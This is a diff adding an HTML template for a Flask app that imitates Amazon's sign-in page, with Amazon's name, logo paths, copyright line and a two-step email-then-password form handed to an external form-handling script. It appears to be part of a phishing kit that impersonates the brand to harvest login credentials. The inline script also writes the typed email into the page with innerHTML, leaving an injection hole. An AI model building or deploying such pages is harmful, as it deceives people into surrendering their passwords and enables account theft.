@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Amazon Sign-In</title>
+    <link
+      rel="shortcut icon"
+      href="{{ url_for('static', filename='images/amazon/favicon.png')}}"
+      type="image/x-icon"
+    />
+    <link
+      rel="stylesheet"
+      href="{{ url_for('static', filename='styles/amazon.css')}}"
+    />
+  </head>
+  <body>
+    <div class="main">
+      <div class="header">
+        <img
+          src="{{ url_for('static', filename='images/amazon/amazon.svg')}}"
+          alt="amazon"
+        />
+      </div>
+
+      <div class="card">
+        <h1>Sign in</h1>
+        <form id="form">
+          <div class="input-container block">
+            <label for="username">Email or mobile phone number</label>
+            <input type="text" name="username" required id="username" />
+          </div>
+
+          <div class="change-email hidden">
+            <p id="prev-email"></p>
+            <span class="link">Change</span>
+          </div>
+
+          <div class="input-container hidden">
+            <div style="display: flex; justify-content: space-between">
+              <label for="password">Password</label>
+              <span class="link">Forgot your password?</span>
+            </div>
+            <input type="password" name="password" required id="password" />
+          </div>
+          <div class="btn-container">
+            <button id="continue" class="block">Continue</button>
+            <button type="submit" class="hidden">Sign in</button>
+          </div>
+          <p class="policies block">
+            By continuing, you agree to Amazon's
+            <span class="link">Conditions of Use</span> and
+            <span class="link">Privacy Notice</span>.
+          </p>
+          <div class="help block">
+            <span></span>
+            <span class="link">Need help?</span>
+          </div>
+
+          <div
+            style="
+              width: 100%;
+              height: 1px;
+              background-color: #e2e2e2;
+              margin-top: 26px;
+              margin-bottom: 18px;
+            "
+            class="block"
+          ></div>
+          <div class="work block">
+            <p>Buying for work?</p>
+            <span class="link">Shop on Amazon Business </span>
+          </div>
+        </form>
+      </div>
+
+      <div class="signup">
+        <div class="seperator">
+          <div class="seperator-line"></div>
+          <span>New to Amazon?</span>
+          <div class="seperator-line"></div>
+        </div>
+
+        <div class="signup-btn">
+          <button>Create your Amazon account</button>
+        </div>
+      </div>
+
+      <footer>
+        <div class="footer-container">
+          <ul>
+            <li class="link">Conditions of Use</li>
+            <li class="link">Privacy Notice</li>
+            <li class="link">Help</li>
+          </ul>
+          <div class="copyright">
+            &copy; 1996-2024, Amazon.com, Inc. or its affiliates
+          </div>
+        </div>
+      </footer>
+    </div>
+
+    <script src="{{ url_for('static', filename='scripts/formHandler.js') }}"></script>
+
+    <!-- Individual template javascript -->
+    <script>
+      const continueButton = document.getElementById("continue");
+
+      continueButton.addEventListener("click", () => {
+        const email = document.getElementById("username").value;
+
+        if (email.trim() === "") {
+          document.getElementById("username").focus();
+          return;
+        }
+        document.getElementById("prev-email").innerHTML = email;
+
+        Array.from(document.getElementsByClassName("hidden")).forEach((e) => {
+          e.classList.remove("hidden");
+        });
+
+        Array.from(document.getElementsByClassName("block")).forEach((e) => {
+          e.classList.remove("block");
+          e.classList.add("hidden");
+        });
+      });
+    </script>
+  </body>
+</html>
